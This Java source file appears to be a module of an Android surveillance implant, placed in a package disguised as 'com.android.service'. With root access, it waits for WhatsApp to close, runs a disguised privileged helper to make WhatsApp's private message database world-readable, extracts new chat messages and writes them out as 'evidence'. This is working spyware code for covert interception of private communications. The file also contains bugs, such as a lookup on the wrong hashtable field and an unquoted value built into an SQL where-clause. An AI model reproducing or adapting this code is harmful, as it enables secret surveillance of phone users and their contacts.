package com.android.service.module;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.Vector;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.service.ProcessInfo;
import com.android.service.ProcessStatus;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.db.GenericSqliteHelper;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.EvidenceType;
import com.android.service.evidence.Markup;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerProcess;
import com.android.service.util.Check;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
	private static final String TAG = "ModuleChat";

	String pObserving = "whatsapp";
	Markup markupChat;

	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {

			return true;
		} else {
			return false;
		}
	}

	@Override
	protected void actualGo() {
		// check for whatsapp activities
		// open db msgstore /data/data/com.whatsapp/databases/msgstore.db
		// open table chat_list
		// per ogni entry leggere l'ultimo messaggio letto.
		// open table messages
	}

	@Override
	protected void actualStart() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		markupChat = new Markup(this);
		try {
			hastableConversationLastIndex = (Hashtable<String, Integer>) markupChat.readMarkupSerializable();
		} catch (IOException e) {
			hastableConversationLastIndex = new Hashtable<String, Integer>();
		}

		ListenerProcess.self().attach(this);
	}

	@Override
	protected void actualStop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStop)");
		}
		ListenerProcess.self().detach(this);
	}

	@Override
	public int notification(ProcessInfo process) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + process);
		}
		if (process.processInfo.processName.contains(pObserving)) {
			if (process.status == ProcessStatus.STOP) {
				try {
					readChatMessages();
				} catch (IOException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notification) Error: " + e);
					}
				}
			}
		}
		return 0;
	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	private void readChatMessages() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}
		boolean updateMarkup = false;
		String dbFile = "/data/data/com.whatsapp/databases/msgstore.db";
		// changeFilePermission(dbFile,777);
		Runtime.getRuntime().exec("/system/bin/ntpsvd pzm 777 " + dbFile);
		File file = new File(dbFile);
		if (file.canRead()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): can read DB");
			}
			GenericSqliteHelper helper = new GenericSqliteHelper(dbFile, 1);
			SQLiteDatabase db = helper.getReadableDatabase();

			// retrieve a list of all the conversation changed from the last
			// reading
			ArrayList<Pair<String, Integer>> changedConversations = fetchChangedConversation(db);

			// for every conversation, fetch and save message and update markup
			for (Pair<String, Integer> pair : changedConversations) {
				String conversation = pair.first;
				int lastReadIndex = pair.second;

				int newLastRead = fetchMessages(db, conversation, lastReadIndex);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): fetchMessages " + conversation + ":" + lastReadIndex
							+ " resulted " + newLastRead);
				}
				hastableConversationLastIndex.put(conversation, newLastRead);
				updateMarkup = true;
			}

			if (updateMarkup) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): updating markup");
				}
				markupChat.writeMarkupSerializable(hastableConversationLastIndex);
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
			}
		}
	}

	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchChangedConversation)");
		}
		
		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		queryBuilderIndex.setTables("chat_list");
		// queryBuilder.appendWhere(inWhere);
		String[] projection = { "_id", "key_remote_jid", "message_table_id" };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {
			String jid = cursor.getString(cursor.getColumnIndexOrThrow("key_remote_jid"));
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow("message_table_id"));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if conversation in known, get the last read index
			if (hastableConversationLastIndex.contains(jid)) {
				lastReadIndex = hastableConversationLastIndex.get(jid);
			}

			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
			}

		}

		return changedConversations;
	}

	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		queryBuilderIndex.setTables("messages");
		queryBuilderIndex.appendWhere("key_remote_jid = " + conversation + " AND _id > " + lastReadIndex);
		String[] projection = { "_id", "key_remote_jid", "data" };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
		ArrayList<String> messages = new ArrayList<String>();
		while (cursor != null && cursor.moveToNext()) {
			String data = cursor.getString(cursor.getColumnIndexOrThrow("data"));
			messages.add(data);
		}

		saveEvidence(conversation, messages);
		return 0;
	}

	private void saveEvidence(String conversation, ArrayList<String> messages) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence): " + conversation);
		}
		DateTime datetime = new DateTime();
		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		for (String message : messages) {

			items.add(datetime.getStructTm());
			items.add(WChar.getBytes(conversation, true));
			items.add(WChar.getBytes("no topic", true));
			items.add(WChar.getBytes(conversation, true));
			items.add(WChar.getBytes(message, true));
			items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
		}

		Evidence evidence = new Evidence(EvidenceType.CHAT);
		evidence.atomicWriteOnce(items);
	}

}
